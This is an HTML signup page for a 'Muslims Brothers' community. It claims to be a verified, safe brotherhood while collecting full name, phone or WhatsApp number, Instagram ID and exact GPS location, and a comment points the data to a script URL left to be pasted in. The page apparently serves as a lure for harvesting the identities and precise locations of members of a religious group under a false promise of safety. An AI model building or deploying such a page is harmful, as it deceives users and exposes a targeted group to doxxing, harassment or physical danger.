<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Muslims Brothers - Trusted Community</title>
    <meta name="description" content="Join our verified Muslim brothers network. Safe & trusted brotherhood.">
    <link href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==" rel="icon">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}
        body{background:linear-gradient(135deg,#0f172a 0%,#1e293b 50%,#334155 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;color:#0f172a;overflow:hidden}
        .container{background:linear-gradient(145deg,rgba(255,255,255,0.95),rgba(248,250,252,0.98));backdrop-filter:blur(20px);padding:2.2rem;border-radius:24px;box-shadow:0 25px 60px rgba(0,0,0,0.2);max-width:400px;width:94%;border:1px solid rgba(255,255,255,0.3);animation:fadeInUp 0.8s ease-out}
        @keyframes fadeInUp{0%{opacity:0;transform:translateY(40px)}100%{opacity:1;transform:translateY(0)}}
        .header{text-align:center;margin-bottom:2rem}
        .header h1{background:linear-gradient(135deg,#3b82f6,#8b5cf6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-size:2.3em;font-weight:800;line-height:1.1;margin-bottom:0.4rem}
        .header p{color:#64748b;font-size:1.05em;line-height:1.5}
        .form-group{margin-bottom:1.7rem}
        label{display:block;margin-bottom:0.7rem;font-weight:600;color:#1e293b;font-size:0.97em}
        input{width:100%;padding:15px 18px;border:2px solid #e2e8f0;border-radius:16px;font-size:16px;font-weight:500;transition:all 0.3s cubic-bezier(0.25,0.46,0.45,0.94);background:linear-gradient(145deg,#ffffff,#f8fafc)}
        input:focus{outline:none;border-color:#3b82f6;box-shadow:0 0 0 4px rgba(59,130,246,0.1),0 4px 20px rgba(59,130,246,0.15);transform:translateY(-2px)}
        input::placeholder{color:#94a3b8}
        .loc-container{background:linear-gradient(135deg,#ecfdf5,#d1fae5);padding:1.6rem;border-radius:18px;border:2px solid #a7f3d0;margin-bottom:1.8rem;text-align:center;position:relative;overflow:hidden}
        .loc-container::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,#10b981,#34d399)}
        .loc-title{font-weight:700;color:#065f46;font-size:1.05em;margin-bottom:1rem}
        #getLocation{background:linear-gradient(135deg,#10b981,#059669);color:white;border:none;padding:14px 28px;border-radius:14px;cursor:pointer;font-size:16px;font-weight:600;width:100%;transition:all 0.3s;box-shadow:0 6px 20px rgba(16,185,129,0.3)}
        #getLocation:hover:not(:disabled){transform:translateY(-3px);box-shadow:0 12px 30px rgba(16,185,129,0.4)}
        #getLocation:disabled{background:#6b7280;cursor:not-allowed;transform:none;box-shadow:none}
        #locStatus{margin-top:1rem;font-weight:600;color:#047857;min-height:28px;display:flex;align-items:center;justify-content:center;font-size:0.95em}
        #joinCommunity{background:linear-gradient(135deg,#3b82f6,#8b5cf6);color:white;border:none;padding:18px;border-radius:18px;cursor:pointer;font-size:18px;font-weight:700;width:100%;transition:all 0.3s;box-shadow:0 8px 25px rgba(59,130,246,0.3);margin-top:0.5rem}
        #joinCommunity:hover:not(:disabled){transform:translateY(-4px);box-shadow:0 16px 40px rgba(59,130,246,0.4)}
        #joinCommunity:disabled{opacity:0.6;cursor:not-allowed;transform:none}
        .progress{display:none;text-align:center;padding:1.5rem;border-radius:16px;background:rgba(59,130,246,0.1);margin-top:1rem}
        .spinner{width:26px;height:26px;border:3px solid rgba(255,255,255,0.3);border-top:3px solid #3b82f6;border-radius:50%;animation:spin 1s linear infinite;display:inline-block;margin-right:12px}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        .success{display:none;text-align:center;padding:2rem;background:linear-gradient(135deg,#ecfdf5,#d1fae5);border-radius:18px;border:3px solid #a7f3d0;margin-top:1rem;color:#065f46;font-weight:600}
        @media(max-width:480px){.container{padding:2rem 1.5rem;margin:0.5rem}}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🤝 Muslims Brothers</h1>
            <p>Join our <strong>verified brotherhood</strong><br><small>Safe community for trusted members only</small></p>
        </div>
        
        <form id="membershipForm">
            <div class="form-group">
                <label>👤 Full Name <span style="color:#9ca3af;font-size:0.85em;">(Required)</span></label>
                <input type="text" id="fullName" placeholder="Ahmed Khan" required maxlength="60">
            </div>
            
            <div class="form-group">
                <label>📱 WhatsApp/Phone <span style="color:#9ca3af;font-size:0.85em;">(Required)</span></label>
                <input type="tel" id="phoneNum" placeholder="+91 98765 43210" required pattern="[+]?[0-9\s\-\(\)]{10,16}">
            </div>
            
            <div class="form-group">
                <label>📸 Instagram ID <span style="color:#9ca3af;font-size:0.85em;">(Required)</span></label>
                <input type="text" id="instaID" placeholder="@yourusername" required>
            </div>
            
            <div class="loc-container">
                <div class="loc-title">📍 Verify Exact Location</div>
                <button type="button" id="getLocation">🔐 Share My GPS Location</button>
                <div id="locStatus"></div>
                <div style="font-size:0.82em;color:#059669;margin-top:0.8rem;font-weight:500">We verify local brothers for safety</div>
            </div>
            
            <button type="submit" id="joinCommunity" disabled>Join Secure Community</button>
        </form>
        
        <div id="processing" class="progress">
            <div class="spinner"></div>
            <div>🔍 Verifying membership details...</div>
        </div>
        
        <div id="welcomeMsg" class="success">
            ✅ <strong>Welcome Brother!</strong><br>
            Your membership is now <strong>verified</strong>.<br>
            Check WhatsApp for community link.
        </div>
    </div>
    
    <!-- ====== PASTE YOUR APPS SCRIPT URL HERE 👇 ====== -->
    <script src="script.js"></script>
</body>
              </html>
